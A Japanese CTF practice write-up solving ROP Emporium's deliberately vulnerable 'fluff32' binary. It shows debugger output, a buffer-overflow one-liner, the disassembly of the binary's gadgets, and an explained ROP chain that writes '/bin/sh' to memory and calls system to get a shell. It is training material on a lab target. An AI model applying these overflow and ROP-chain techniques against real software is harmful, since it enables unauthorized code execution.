```
~/ctf/practice-pwn/ROP-Emporium/fluff32:yyy@(*｡˃̵ω ˂̵｡) < ./fluff32
fluff by ROP Emporium
32bits

You know changing these strings means I have to rewrite my solutions...
> hoge

Exiting
```

```
gdb-peda$ patto AFAA
AFAA found at offset: 44
```

```
gdb-peda$ i func
All defined functions:

Non-debugging symbols:
0x080483c0  _init
0x08048400  printf@plt
0x08048410  fgets@plt
0x08048420  puts@plt
0x08048430  system@plt
0x08048440  __libc_start_main@plt
0x08048450  setvbuf@plt
0x08048460  memset@plt
0x08048480  _start
0x080484b0  __x86.get_pc_thunk.bx
0x080484c0  deregister_tm_clones
0x080484f0  register_tm_clones
0x08048530  __do_global_dtors_aux
0x08048550  frame_dummy
0x0804857b  main
0x080485f6  pwnme
0x0804864c  usefulFunction
0x08048670  questionableGadgets
0x080486a0  __libc_csu_init
0x08048700  __libc_csu_fini
0x08048704  _fini
```

usefulFunctionに遷移させてみる

```shell
$ python -c 'print "A" * 44 + "\x4c\x86\x04\x08"' |./fluff32
fluff by ROP Emporium
32bits

You know changing these strings means I have to rewrite my solutions...
> exploit_err.py	exploit.py  flag.txt  fluff32  fluff32.dis  fluff32.zip  input.txt  memo  peda-session-fluff32.txt  ropgadget  writeup.md
zsh: done                                        python -c 'print "A" * 44 + "\x4c\x86\x04\x08"' |
zsh: illegal hardware instruction (core dumped)  ./fluff32
```

例によってlsするだけの関数になっているので、シェルを奪う

今回はquestionableGadgetsにあるGadgetをどう使うかが問題

```
gdb-peda$ disas questionableGadgets
Dump of assembler code for function questionableGadgets:
   0x08048670 <+0>:	pop    edi
   0x08048671 <+1>:	xor    edx,edx
   0x08048673 <+3>:	pop    esi
   0x08048674 <+4>:	mov    ebp,0xcafebabe
   0x08048679 <+9>:	ret    
   0x0804867a <+10>:	pop    esi
   0x0804867b <+11>:	xor    edx,ebx
   0x0804867d <+13>:	pop    ebp
   0x0804867e <+14>:	mov    edi,0xdeadbabe
   0x08048683 <+19>:	ret    
   0x08048684 <+20>:	mov    edi,0xdeadbeef
   0x08048689 <+25>:	xchg   edx,ecx
   0x0804868b <+27>:	pop    ebp
   0x0804868c <+28>:	mov    edx,0xdefaced0
   0x08048691 <+33>:	ret    
   0x08048692 <+34>:	pop    edi
   0x08048693 <+35>:	mov    DWORD PTR [ecx],edx
   0x08048695 <+37>:	pop    ebp
   0x08048696 <+38>:	pop    ebx
   0x08048697 <+39>:	xor    BYTE PTR [ecx],bl
   0x08048699 <+41>:	ret    
   0x0804869a <+42>:	xchg   ax,ax
   0x0804869c <+44>:	xchg   ax,ax
   0x0804869e <+46>:	xchg   ax,ax
End of assembler dump.
```

なんとかして/bin/shをsystemの引数として渡したい

注目するべきは `xchg  edx, ecx` と `mov  DWORD PTR [ecx], edx` で、ecxにbufferのアドレスを、edxに/binと/sh\x00を2回に分けて書き込めばいけそう

まず `pop ebx; ret` となるようなGadgetを探して、ebxにbufferのアドレスを格納しておく

その後、 `xor  edx, edx` でedxを初期化して、 `xor  edx, ebx` で `0となっているedx` と `bufferのアドレスが入ったebx` をxorすることで、edxにbufferのアドレスを格納する

そして、 `xchg  edx, ecx` を呼ぶことで、ecxにbufferのアドレスを書き込める

次に、edxに書き込みたい文字列を格納するには、ecxと同様に

1. `pop ebx; ret` でebxに格納したい文字列をebxに代入

2. `xor  edx, edx` でedxを0に初期化

3. `xor  edx, ebx` でedxに格納したい文字列を代入する


あとは、 `mov    DWORD PTR [ecx],edx` のところのGadgetを呼ぶだけ

ただし、 `xor  BYTE PTR [ecx], bl` があるので、ebxには0を入れて、値が変わらないようにしておく

```
~/ctf/practice-pwn/ROP-Emporium/fluff32:yyy@(*｡˃̵ω ˂̵｡) < python exploit.py
[+] Starting local process './fluff32': pid 12939
fluff by ROP Emporium
32bits

You know changing these strings means I have to rewrite my solutions..
[*] Switching to interactive mode
.
> $
$ cat flag.txt
ROPE{a_placeholder_32byte_flag!}
```
